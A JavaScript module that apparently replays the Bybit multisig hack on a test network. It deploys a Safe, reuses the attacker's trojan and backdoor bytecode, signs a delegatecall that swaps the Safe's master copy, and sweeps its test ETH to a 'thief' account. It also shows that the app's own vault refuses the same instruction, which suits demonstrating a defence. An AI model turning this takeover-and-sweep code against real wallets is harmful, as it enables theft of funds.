import { readFileSync } from 'node:fs'
import {
  BaseError,
  ContractFunctionRevertedError,
  concat,
  encodeFunctionData,
  encodePacked,
  formatEther,
  getAddress,
  getContractAddress,
  keccak256,
  pad,
  parseAbi,
  parseEther,
  size,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { DEMO_ATTACK_GAS, DEMO_PRIORITY_FEE, FACTORY, factoryAbi, vaultAbi } from '../../app/src/config.js'
import { BYBIT } from './replays.js'

export const SAFE = {
  version: '1.1.1',
  masterCopy: getAddress('0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F'),
  factory: getAddress('0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B'),
  owners: 6,
  threshold: 3,
  safeTxGas: 45_746n,
}

export const DEPLOYER = getAddress('0x4e59b44847b379578588920cA78FbF26c0B4956C')

export const HELD = parseEther('0.001')

export const GAS_MONEY = { everyday: parseEther('0.006'), rules: parseEther('0.001'), thief: parseEther('0.003') }

export const BYBIT_REASON = 'Borrowed code would run in your account'

export const REPLAY_KEYS = {
  REPLAY_EVERYDAY_PRIVATE_KEY: "Replay vaults' everyday key",
  REPLAY_RULES_PRIVATE_KEY: "Replay vaults' Rules key, kept on the laptop",
  REPLAY_THIEF_PRIVATE_KEY: 'Replay thief: plays the attacker and receives what the Bybit sweep takes',
  ...Object.fromEntries(
    Array.from({ length: SAFE.owners }, (_, i) => [`BYBIT_SIGNER_${i + 1}_PRIVATE_KEY`, `Owner ${i + 1} of the Bybit replay's Safes`]),
  ),
}

const MAKE_KEYS = 'scripts/sepolia-replays.js keys'
const CODE = new URL('./bybit-code.json', import.meta.url)
const SWEEP_GAS = 200_000n
const DEADLINE_SECONDS = 600n
const RECEIPT_TIMEOUT_MS = 540_000
const BUFFER = 13n

export const safeAbi = parseAbi([
  'function setup(address[] owners, uint256 threshold, address to, bytes data, address fallbackHandler, address paymentToken, uint256 payment, address paymentReceiver)',
  'function execTransaction(address to, uint256 value, bytes data, uint8 operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, bytes signatures) payable returns (bool)',
  'function getTransactionHash(address to, uint256 value, bytes data, uint8 operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 nonce) view returns (bytes32)',
  'function nonce() view returns (uint256)',
  'function getOwners() view returns (address[])',
  'function getThreshold() view returns (uint256)',
  'function VERSION() view returns (string)',
])
const safeFactoryAbi = parseAbi([
  'function createProxyWithNonce(address mastercopy, bytes initializer, uint256 saltNonce) returns (address)',
  'function proxyCreationCode() pure returns (bytes)',
])
const trojanAbi = parseAbi(['function transfer(address to, uint256 value)'])
const backdoorAbi = parseAbi(['function sweepETH(address receiver)'])

export function replayAccounts() {
  const account = (name) => {
    if (!process.env[name]) throw new Error(`${name} is missing from .env. Run: node --env-file=../.env ${MAKE_KEYS}`)
    return privateKeyToAccount(process.env[name])
  }
  return {
    everyday: account('REPLAY_EVERYDAY_PRIVATE_KEY'),
    rules: account('REPLAY_RULES_PRIVATE_KEY'),
    thief: account('REPLAY_THIEF_PRIVATE_KEY'),
    signers: Array.from({ length: SAFE.owners }, (_, i) => account(`BYBIT_SIGNER_${i + 1}_PRIVATE_KEY`)),
  }
}

export async function demoFees(publicClient) {
  const { baseFeePerGas } = await publicClient.getBlock()
  return { maxPriorityFeePerGas: DEMO_PRIORITY_FEE, maxFeePerGas: (baseFeePerGas ?? 0n) * 2n + DEMO_PRIORITY_FEE }
}

export async function sendSteps({ publicClient, wallet }, account, steps, log = () => {}) {
  if (steps.length === 0) return []
  const [nonce, fees] = await Promise.all([
    publicClient.getTransactionCount({ address: account.address, blockTag: 'pending' }),
    demoFees(publicClient),
  ])
  const hashes = []
  for (const [i, step] of steps.entries()) {
    const gas = ((await publicClient.estimateGas({ account, ...step.request })) * BUFFER) / 10n
    hashes.push(await wallet(account).sendTransaction({ ...step.request, ...fees, gas, nonce: nonce + i }))
  }
  return Promise.all(
    steps.map(async (step, i) => {
      const receipt = await publicClient.waitForTransactionReceipt({ hash: hashes[i], timeout: RECEIPT_TIMEOUT_MS })
      if (receipt.status !== 'success') throw new Error(`${step.label}: failed (${hashes[i]})`)
      log(step.label, receipt)
      return receipt
    }),
  )
}

export async function reasonOf(publicClient, request) {
  try {
    await publicClient.simulateContract(request)
    return null
  } catch (error) {
    const reverted = error instanceof BaseError ? error.walk((cause) => cause instanceof ContractFunctionRevertedError) : null
    return reverted?.reason ?? reverted?.data?.errorName ?? error.shortMessage ?? 'refused'
  }
}

export function bybitCode() {
  return JSON.parse(readFileSync(CODE, 'utf8'))
}

const creationCode = (runtime) => concat(['0x61', toHex(size(runtime), { size: 2 }), '0x80600c6000396000f3', runtime])

export function copies(thief) {
  const code = bybitCode()
  const attacker = BYBIT.attacker.slice(2).toLowerCase()
  const runtimes = { trojan: code.trojan, backdoor: code.backdoor.toLowerCase().split(attacker).join(thief.slice(2).toLowerCase()) }
  return Object.fromEntries(
    Object.entries(runtimes).map(([name, runtime]) => {
      const bytecode = creationCode(runtime)
      return [name, { runtime, deploy: concat([zeroHash, bytecode]), address: getContractAddress({ opcode: 'CREATE2', from: DEPLOYER, salt: zeroHash, bytecode }) }]
    }),
  )
}

let proxyCode = null

function setupCall(accounts) {
  const owners = accounts.signers.map((signer) => signer.address)
  return encodeFunctionData({ abi: safeAbi, functionName: 'setup', args: [owners, BigInt(SAFE.threshold), zeroAddress, '0x', zeroAddress, zeroAddress, 0n, zeroAddress] })
}

export async function safeAt(publicClient, accounts, run) {
  proxyCode ??= await publicClient.readContract({ address: SAFE.factory, abi: safeFactoryAbi, functionName: 'proxyCreationCode' })
  const salt = keccak256(encodePacked(['bytes32', 'uint256'], [keccak256(setupCall(accounts)), run]))
  return getContractAddress({ opcode: 'CREATE2', from: SAFE.factory, salt, bytecode: concat([proxyCode, pad(SAFE.masterCopy)]) })
}

export async function codeOf(publicClient, safe) {
  const slot = (await publicClient.getStorageAt({ address: safe, slot: zeroHash })) ?? zeroHash
  return getAddress(`0x${slot.slice(-40)}`)
}

async function firstUnused(publicClient, accounts) {
  const hacked = async (run) => {
    const code = await codeOf(publicClient, await safeAt(publicClient, accounts, run))
    return code !== zeroAddress && code !== SAFE.masterCopy
  }
  let low = 0n
  let high = 1n
  while (await hacked(high - 1n)) {
    low = high
    high *= 2n
  }
  high -= 1n
  while (low < high) {
    const middle = (low + high) / 2n
    if (await hacked(middle)) low = middle + 1n
    else high = middle
  }
  return low
}

export async function bybitScene(publicClient, accounts) {
  const { trojan, backdoor } = copies(accounts.thief.address)
  const [vault, run] = await Promise.all([
    publicClient.readContract({ address: FACTORY, abi: factoryAbi, functionName: 'vaultOf', args: [accounts.everyday.address] }),
    firstUnused(publicClient, accounts),
  ])
  return { trojan: trojan.address, backdoor: backdoor.address, vault, run, safe: await safeAt(publicClient, accounts, run) }
}

export async function prepareBybit(ctx, accounts, log) {
  const { publicClient, builder } = ctx
  const scene = await bybitScene(publicClient, accounts)
  const [code, held, loot] = await Promise.all([
    codeOf(publicClient, scene.safe),
    publicClient.getBalance({ address: scene.safe }),
    publicClient.getBalance({ address: accounts.thief.address }),
  ])
  const steps = []
  if (code === zeroAddress) {
    steps.push({
      label: `Make Safe #${scene.run} (version ${SAFE.version}, ${SAFE.threshold} of ${SAFE.owners} signers) through Safe's own factory`,
      request: { to: SAFE.factory, data: encodeFunctionData({ abi: safeFactoryAbi, functionName: 'createProxyWithNonce', args: [SAFE.masterCopy, setupCall(accounts), scene.run] }) },
    })
  }
  if (held < HELD) steps.push({ label: `Put ${formatEther(HELD - held)} test ETH in Safe #${scene.run}`, request: { to: scene.safe, value: HELD - held } })
  const returned = loot > GAS_MONEY.thief + HELD / 2n ? loot - GAS_MONEY.thief : 0n
  const giveBack = returned > 0n ? [{ label: `The thief returns ${formatEther(returned)} swept test ETH to the Builder key`, request: { to: builder.address, value: returned } }] : []
  await Promise.all([sendSteps(ctx, builder, steps, log), sendSteps(ctx, accounts.thief, giveBack, log)])
  return scene
}

export async function runBybit({ publicClient, wallet }, accounts) {
  const started = Date.now()
  const scene = await bybitScene(publicClient, accounts)
  const balance = (address) => publicClient.getBalance({ address })
  const [codeBefore, safeBefore, vaultBefore, thiefNonce, fees, block] = await Promise.all([
    codeOf(publicClient, scene.safe),
    balance(scene.safe),
    balance(scene.vault),
    publicClient.getTransactionCount({ address: accounts.thief.address, blockTag: 'pending' }),
    demoFees(publicClient),
    publicClient.getBlock(),
  ])
  if (codeBefore !== SAFE.masterCopy || safeBefore < HELD) {
    throw new Error("The next Bybit replay Safe isn't ready yet. It's made right after each run: try again in a few seconds, or run setup.")
  }
  const safeNonce = await publicClient.readContract({ address: scene.safe, abi: safeAbi, functionName: 'nonce' })
  const instruction = encodeFunctionData({ abi: trojanAbi, functionName: 'transfer', args: [scene.backdoor, 0n] })
  const safeTx = [scene.trojan, 0n, instruction, 1, SAFE.safeTxGas, 0n, 0n, zeroAddress, zeroAddress]
  const hash = await publicClient.readContract({ address: scene.safe, abi: safeAbi, functionName: 'getTransactionHash', args: [...safeTx, safeNonce] })
  const approvers = accounts.signers.slice(0, SAFE.threshold).toSorted((a, b) => (BigInt(a.address) < BigInt(b.address) ? -1 : 1))
  const signatures = concat(await Promise.all(approvers.map((signer) => signer.sign({ hash }))))
  const takeover = { address: scene.safe, abi: safeAbi, functionName: 'execTransaction', args: [...safeTx, signatures] }
  const attempt = {
    address: scene.vault,
    abi: vaultAbi,
    functionName: 'run',
    args: [[{ target: scene.trojan, value: 0n, data: instruction, operation: 1 }], [], block.timestamp + DEADLINE_SECONDS],
  }
  const [takeoverGas, reason] = await Promise.all([
    publicClient.estimateContractGas({ ...takeover, account: accounts.thief }),
    reasonOf(publicClient, { ...attempt, account: accounts.everyday }),
  ])
  const hashes = await Promise.all([
    wallet(accounts.thief).writeContract({ ...takeover, ...fees, gas: (takeoverGas * BUFFER) / 10n, nonce: thiefNonce }),
    wallet(accounts.thief).sendTransaction({
      to: scene.safe,
      data: encodeFunctionData({ abi: backdoorAbi, functionName: 'sweepETH', args: [accounts.thief.address] }),
      ...fees,
      gas: SWEEP_GAS,
      nonce: thiefNonce + 1,
    }),
    wallet(accounts.everyday).writeContract({ ...attempt, ...fees, gas: DEMO_ATTACK_GAS }),
  ])
  const receipts = await Promise.all(hashes.map((hash) => publicClient.waitForTransactionReceipt({ hash, timeout: RECEIPT_TIMEOUT_MS })))
  const [codeAfter, safeAfter, vaultAfter] = await Promise.all([codeOf(publicClient, scene.safe), balance(scene.safe), balance(scene.vault)])
  const sent = ({ transactionHash, status, blockNumber, gasUsed, effectiveGasPrice }) => ({ hash: transactionHash, status, block: blockNumber, fee: gasUsed * effectiveGasPrice })
  const [takeoverSent, sweepSent, attemptSent] = receipts.map(sent)
  return {
    run: scene.run,
    trojan: scene.trojan,
    backdoor: scene.backdoor,
    signers: approvers.map((signer) => signer.address),
    thief: accounts.thief.address,
    everydayKey: accounts.everyday.address,
    instruction,
    codeBefore,
    codeAfter,
    safe: { address: scene.safe, before: safeBefore, after: safeAfter },
    vault: { address: scene.vault, before: vaultBefore, after: vaultAfter, reason },
    takeover: takeoverSent,
    sweep: sweepSent,
    attempt: attemptSent,
    ms: Date.now() - started,
  }
}
